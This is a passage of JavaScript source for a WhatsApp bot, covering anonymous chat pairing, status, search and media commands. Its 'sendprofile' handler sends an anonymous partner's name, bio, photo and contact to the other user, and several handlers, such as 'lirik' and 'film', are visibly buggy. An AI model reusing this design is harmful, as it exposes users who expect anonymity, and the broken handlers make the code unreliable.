await Dani.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, `Made With 🤍 Dani | Copyright 2022`, m)
room.b = m.sender
room.state = 'CHATTING'
await Dani.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, `Made With 🤍 Dani | Copyright 2022`, m)
} else {
let id = + new Date
db.data.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, `Made With 🤍 Dani | Copyright 2022`, m)
}
break
}
case 'next': case 'lanjut': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)  
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
let romeo = Object.values(db.data.anonymous).find(room => room.check(m.sender))
if (!romeo) {
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
throw false
}
let other = romeo.other(m.sender)
if (other) await Dani.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
delete db.data.anonymous[romeo.id]
let room = Object.values(db.data.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await Dani.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, `Made With 🤍 Dani | Copyright 2022`, m)
room.b = m.sender
room.state = 'CHATTING'
await Dani.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, `Made With 🤍 Dani | Copyright 2022`, m)
} else {
let id = + new Date
db.data.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, `Made With 🤍 Dani | Copyright 2022`, m)
}
break
}
case 'sendprofile': case 'sendcontact':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd)  
if (isBan) return sticBan(from)
if (m.isGroup) return m.reply('This Features Cannot Be Use in Group!')
let room = Object.values(db.data.anonymous).find(room => room.check(m.sender))
if (!room) {
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'START' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `_You Are Not In Anonymous Session, Press The Button To Find A Partner_`)
throw false
}
let profile = await Dani.profilePictureUrl(room.b)
let status = await Dani.fetchStatus(room.b)
let msg = await Dani.sendImage(room.a, profile, `Name : ${await Dani.getName(room.b)}\nBio : ${status.status}\nUser : @${room.b.split("@")[0]}`, m, { mentions: [room.b] })
Dani.sendContact(room.a, [room.b.split("@")[0]], msg)
}
break
case 'public': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
Dani.public = true
m.reply('Sukse Change To Public Usage')
}
break
case 'self': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
Dani.public = false
m.reply('Sukses Change To Self Usage')
}
break
case 'ping': case 'botstatus': case 'statusbot': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
m.reply(respon)
}
break
case 'speedtest': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
m.reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
if (stdout.trim()) m.reply(stdout)
if (stderr.trim()) m.reply(stderr)
}
}
break
case 'owner': case 'creator': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
Dani.sendContact(m.chat, global.owner, freply)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
buff = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Dani.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mp4' }, { quoted: freply })     
limitAdd(sender, limit)
break
case 'request': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} hello dev please add a downloader feature`)
teks = `*| REQUEST |*`
teks1 = `\n\nNumber : @${m.sender.split("@")[0]}\nRequest : ${args.join(" ")}`
teks2 = `\n\nSuccessfully sent to owner`
Dani.sendMessage(`6285714627920@s.whatsapp.net`, {text: teks + teks1, mentions:[m.sender]}, {quoted:freply})
Dani.sendMessage(m.chat, {text: teks + teks2 + teks1, mentions:[m.sender]}, {quoted:freply})
limitAdd(sender, limit)
}
break
case 'bug': case 'report': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if(!text) return m.reply(`Enter The Bug\n\nExample: ${command} Menu Error`)
Dani.sendMessage(`6285714627920@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}\nReport Message: ${text}` }, {quoted:freply})
textImg(`Successfully Reported To The Owner\n\nPlease Make Sure The Bug Is Valid, If You Play With This, Use This Feature Again And Again For No Reason, You Will Be Blocked For Sure !`)
limitAdd(sender, limit)
}
break
case 'dashboard':
addCountCmd('#dashboard', sender, _cmd)
if (isBan) return sticBan(from)
var posi = await getPosiCmdUser(sender, _cmdUser)
_cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
_cmd.sort((a, b) => (a.count  < b.count) ? 1 : -1)
var posi = await getPosiCmdUser(sender, _cmdUser)
var jumlahCmd = _cmd.length
if (jumlahCmd > 10) jumlahCmd = 10
var jumlah = _cmdUser[posi].db.length
if (jumlah > 5) jumlah = 5
var totalUser = 0
for (let x of _cmdUser[posi].db) {
totalUser = totalUser + x.count
}
var total = 0
for (let o of _cmd) {
total = total + o.count
}
var teks = `*DANI BOT DASHBOARD*\n\n*HIT*\n• GLOBAL : ${total}\n• USER : ${totalUser}\n\n`
teks += `*Most Command Global*\n`
for (let u = 0; u < jumlahCmd; u ++) {
teks += `• ${_cmd[u].nama} : ${_cmd[u].count}\n`
}
teks += `\n*Most Command User*\n`
for (let i = 0; i < jumlah; i ++) {
teks += `• ${_cmdUser[posi].db[i].nama} : ${_cmdUser[posi].db[i].count}\n`
}
textImg(teks)
break
case 'wattpad': {         
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/wattpad?query=${text}&apikey=${daniapi}`)
let capt = `「 *WATTPAD* 」\n\n`
for (let i of res.result) {
capt += `❏ *Judul* : ${i.judul}\n`
capt += `❏ *Dibaca* : ${i.dibaca}\n`
capt += `❏ *Divote* : ${i.divote}\n`
capt += `❏ *Bab* : ${i.bab}\n`
capt += `❏ *Waktu* : ${i.waktu}\n`
capt += `❏ *Desc* : ${i.description}\n`
capt += `❏ *Url* : ${i.url}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumb, capt, freply)
limitAdd(sender, limit)
}
break
case 'webtoons': {         
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/webtoons?query=${text}&apikey=${daniapi}`)
let capt = `「 *WEB TOONS* 」\n\n`
for (let i of res.result) {
capt += `❏ *Judul* : ${i.judul}\n`
capt += `❏ *Like* : ${i.like}\n`
capt += `❏ *Creator* : ${i.creator}\n`
capt += `❏ *Genre* : ${i.genre}\n`
capt += `❏ *Url* : ${i.url}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumbnail, capt, freply)
limitAdd(sender, limit)
}
break
case 'mangatoons': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/mangatoons?query=${text}&apikey=${daniapi}`)
let capt = `「 *MANGA TOONS* 」\n\n`
for (let i of res.result) {
capt += `❏ *Judul* : ${i.judul}\n`
capt += `❏ *Genre* : ${i.genre}\n`            
capt += `❏ *Link* : ${i.link}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumbnail, capt, freply)
limitAdd(sender, limit)
}
break
case 'drakor': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/drakor?query=${text}&apikey=${daniapi}`)
let capt = `「 *DRAKOR* 」\n\n`
for (let i of res.result) {
capt += `❏ *Judul* : ${i.judul}\n`
capt += `❏ *Years* : ${i.years}\n`
capt += `❏ *Genre* : ${i.genre}\n`
capt += `❏ *Url* : ${i.url}\n`
capt += `❏ *Thumbnail* : ${i.thumbnail}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumbnail, capt, freply)
limitAdd(sender, limit)
}
break
case 'film': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`https://api.akuari.my.id/search/film?query=${text}`)
let capt = `「 *FILM* 」\n\n`
for (let i of res.hasil) {
capt += `❏ *Judul* : ${i.judul}\n`
capt += `❏ *Quality* : ${i.quality}\n`
capt += `❏ *Type* : ${i.type}\n`
capt += `❏ *Upload* : ${i.upload}\n`
capt += `❏ *Link* : ${i.link}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumb, capt, freply)
limitAdd(sender, limit)
}
break
case 'layarkaca': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/layarkaca?query=${text}&apikey=${daniapi}`)
let capt = `「 *KAYAR KACA* 」\n\n`
for (let i of res.result) {
capt += `❏ *Title* : ${i.title}\n`
capt += `❏ *Author* : ${i.author}\n`       
capt += `❏ *Stars* : ${i.stars}\n`       
capt += `❏ *Url* : ${i.url}\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumbnail, capt, freply)
limitAdd(sender, limit)
}
break
case 'noveltoons': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/noveltoons?query=${text}&apikey=${daniapi}`)
let capt = `「 *NOVEL TOONS* 」\n\n`
for (let i of res.result) {
capt += `❏ *Judul* : ${i.judul}\n`
capt += `❏ *Like* : ${i.like}\n`       
capt += `❏ *Genre* : ${i.genre}\n`       
capt += `❏ *Url* : ${i.url}\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumbnail, capt, freply)
limitAdd(sender, limit)
}
break
case 'bioskop': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/bioskop?apikey=${daniapi}`)
let capt = `「 *BIOSKOP* 」\n\n`
for (let i of res.result){
capt += `❏ *Title* : ${i.title}\n`                       
capt += `❏ *Genre* : ${i.genre}\n`               
capt += `❏ *Duration* : ${i.duration}\n`               
capt += `❏ *Rilis* : ${i.release}\n`               
capt += `❏ *Director* : ${i.director}\n`               
capt += `❏ *Cast* : ${i.cast}\n`               
capt += `❏ *Url* : ${i.url}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].img, capt, freply)
limitAdd(sender, limit)
}
break     
case 'bioskopnow': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/bioskopnow?apikey=${daniapi}`)
let capt = `「 *BIOSKOP NOW* 」\n\n`
for (let i of res.result){
capt += `❏ *Title* : ${i.title}\n`                       
capt += `❏ *Genre* : ${i.genre}\n`               
capt += `❏ *Duration* : ${i.duration}\n`               
capt += `❏ *Playing At* : ${i.playingAt}\n`               
capt += `❏ *Url* : ${i.url}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].img, capt, freply)
limitAdd(sender, limit)
}
break     
case 'soundcloudsearch': case 'scsearch': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`https://api.akuari.my.id/search/searchsoundcloud?query=${text}`)
let capt = `「 *SOUND CLOUD* 」\n\n`
for (let i of res.hasil) {
capt += `❏ *Title* : ${i.title}\n`
capt += `❏ *Artist* : ${i.artist}\n`       
capt += `❏ *Views* : ${i.views}\n`       
capt += `❏ *Release* : ${i.release}\n`       
capt += `❏ *Duration* : ${i.timestamp}\n`       
capt += `❏ *Url* : ${i.url}\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumb, capt, freply)
limitAdd(sender, limit)
}
break      
case 'chordlagu': {                    
addCountCmd(`#${command.slice(0)}`, sender, _cmd)    
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/search/chordlagu?query=${text}&apikey=${daniapi}`)
let { chord, artist, title } = res.result
let capt = `「 *CHORD LAGU* 」

❏ *Title* : ${title}
❏ *Artist* : ${artist}
❏ *Chord* : ${chord}`
textImg(capt)
limitAdd(sender, limit)
}
break            
case 'gsmarena': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/search/gsmarena?query=${text}&apikey=${daniapi}`)
let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `「 *GSMARENA* 」

❏ *Title* : ${judul}
❏ *Realease* : ${rilis}
❏ *Size* : ${ukuran}
❏ *Type* : ${type}
❏ *Storage* : ${storage}
❏ *Display* : ${display}
❏ *Inchi* : ${inchi}
❏ *Pixel* : ${pixel}
❏ *Video Pixel* : ${videoPixel}
❏ *Ram* : ${ram}
❏ *Chipset* : ${chipset}
❏ *Battery* : ${batrai}
❏ *Battery Brand* : ${merek_batre}
❏ *Detail* : ${detail}`
Dani.sendImage(m.chat, thumb, capt, freply)
limitAdd(sender, limit)
}
break
case 'wangy': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.textt
webapi = await fetchJson(`${webdani}/api/other/wangy?name=${text}&apikey=${daniapi}`)
anu = webapi.result
textImg(anu)
limitAdd(sender, limit)
}
break
case 'wangy2': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.textt
webapi = await fetchJson(`${webdani}/api/other/wangy2?name=${text}&apikey=${daniapi}`)
anu = webapi.result
textImg(anu)
limitAdd(sender, limit)
}
break
case 'nenen': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.textt
webapi = await fetchJson(`${webdani}/api/other/nenen?name=${text}&apikey=${daniapi}`)
anu = webapi.result
textImg(anu)
limitAdd(sender, limit)
}
break
case 'simp': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.textt
webapi = await fetchJson(`${webdani}/api/other/simp?name=${text}&apikey=${daniapi}`)
anu = webapi.result
textImg(anu)
limitAdd(sender, limit)
}
break
case 'sherk': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.textt
webapi = await fetchJson(`${webdani}/api/other/sherk?name=${text}&apikey=${daniapi}`)
anu = webapi.result
textImg(anu)
limitAdd(sender, limit)
}
break
case 'groupsearch': case 'gcsearch': case 'gcwasearch': case 'gcwa': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/search/linkwa?query=${text}&apikey=${daniapi}`)
let teks = `「 *GROUP WA* 」\n\n`
for (let i of res.result) {
teks += `❏ *Nama* : ${i.nama}\n`                              
teks += `❏ *Link* : ${i.link}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break        
case 'cariresep': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/search/cariresep?query=${text}&apikey=${daniapi}`)
let teks = `「 *CARI RESEP* 」\n\n`
for (let i of res.result) {
teks += `❏ *Judul* : ${i.judul}\n`                              
teks += `❏ *Link* : ${i.link}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break        
case 'jalantikus': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/search/jalantikus?query=${text}&apikey=${daniapi}`)
let teks = `「 *JALAN TIKUS* 」\n\n`
for (let i of res.result) {
teks += `❏ *Title* : ${i.title}\n`                              
teks += `❏ *Category* : ${i.category}\n`                              
teks += `❏ *Date* : ${i.date}\n`                               
teks += `❏ *Link* : ${i.link}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break        
case 'lirik': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`https://api.akuari.my.id/search/lirik?query=${text}`)
let teks = `「 *Lyrics Song* 」\n\n`
teks += `❏ *Title* : ${i.judul}\n`                              
teks += `❏ *Artis* : ${i.artis}\n`                                        
teks += `❏ *Lirik* : ${i.lirik}\n\n\n`
textImg(teks)
limitAdd(sender, limit)
}
break        
case 'sfile': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`https://api.akuari.my.id/search/sfilesearch?query=${text}`)
let teks = `「 *SFILE* 」\n\n`
for (let i of res.result) {
teks += `❏ *Title* : ${i.title}\n`           
teks += `❏ *Size* : ${i.size}\n`           
teks += `❏ *Link* : ${i.link}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break             
case 'stickerpacksearch': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/search/sticker?query=${text}&apikey=${daniapi}`)
let teks = `「 *STICKER PACK* 」\n\n`
for (let i of res.result) {
teks += `❏ *Title* : ${i.title}\n`           
teks += `❏ *Url* : ${i.url}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break            
case 'stickertelesearch': case 'stickertelegramsearch': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/search/stelesearch?query=${text}&apikey=${daniapi}`)
let teks = `「 *STICKER TELE* 」\n\n`
for (let i of res.result) {
teks += `❏ *Title* : ${i.title}\n`           
teks += `❏ *Link* : ${i.link}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break            
case 'stickerlinesearch': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/search/stickerline?query=${text}&apikey=${daniapi}`)
let teks = `「 *STICKER LINE* 」\n\n`
for (let i of res.result) {
teks += `❏ *ID* : ${i.id}\n`           
teks += `❏ *Title* : ${i.title}\n`           
teks += `❏ *Desc* : ${i.description}\n`           
teks += `❏ *Sticker Animated* : ${i.stickerAnimated}\n`           
teks += `❏ *Sticker Sound* : ${i.stickerSound}\n`           
teks += `❏ *Author ID* : ${i.authorId}\n`       
teks += `❏ *Author Name* : ${i.authorName}\n`    
teks += `❏ *Url* : ${i.url}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break             
case 'corona': {                    
addCountCmd(`#${command.slice(0)}`, sender, _cmd)    
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.negara
sticWait(from)
let res = await fetchJson(`${webdani}/api/information/corona?negara=${text}&apikey=${daniapi}`)
let { sembuh, meninggal, kasus } = res.result
let capt = `「 *CORONA* 」

❏ *Kasus* : ${kasus}
❏ *Meninggal* : ${meninggal}
❏ *Sembuh* : ${sembuh}`
textImg(capt)
